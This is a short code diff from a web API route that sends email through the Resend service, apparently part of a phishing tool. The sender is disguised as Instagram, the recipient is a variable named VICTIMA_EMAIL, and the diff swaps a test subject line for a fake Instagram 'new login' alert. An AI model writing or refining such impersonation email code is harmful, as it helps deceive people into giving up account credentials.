@@ -11,7 +11,7 @@ export const POST: APIRoute = async ({ request }) => {
     const response = await resend.emails.send({
       from: "Instagram <instagram@resend.dev>",
       to: [VICTIMA_EMAIL],
-      subject: "Prueba desde Resend",
+      subject: "Nuevo inicio de sesión en Instagram desde Instagram",
       html: CONTENIDO_HTML,
     });
 
